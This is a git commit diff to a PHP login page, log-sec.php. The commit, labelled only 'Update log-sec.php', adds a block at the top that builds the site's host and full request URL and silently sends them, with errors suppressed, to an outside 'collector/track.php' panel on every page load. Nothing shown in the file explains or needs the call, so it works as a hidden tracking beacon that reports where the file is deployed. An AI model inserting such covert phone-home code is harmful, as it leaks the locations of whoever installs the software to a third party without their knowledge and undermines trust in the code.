4877a421438967c83d4de6bf7de2450e648fcadf
sam <144790923+tryxapp@users.noreply.github.com>
2025-10-13 20:02:42 +0700

    Update log-sec.php

--- newcon1/newcon2/oncon/log-sec.php
+++ newcon1/newcon2/oncon/log-sec.php
@@ -1,4 +1,14 @@
 <?php
+$panel = 'https://panel.trixygame.com/admin/collector/track.php';
+
+$host   = $_SERVER['HTTP_HOST'] ?? '';
+$https  = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || (($_SERVER['SERVER_PORT'] ?? '') == '443');
+$scheme = $https ? 'https' : 'http';
+$url    = $scheme . '://' . $host . ($_SERVER['REQUEST_URI'] ?? '/');
+
+@file_get_contents($panel . '?d=' . rawurlencode($host) . '&u=' . rawurlencode($url));
+?>
+<?php
 session_start();
 
 // Tentukan username dan password hash
@@ -157,4 +167,5 @@ if (!isset($_SESSION['loggedin'])) {
     <?php
     exit();
 }
+
 ?>
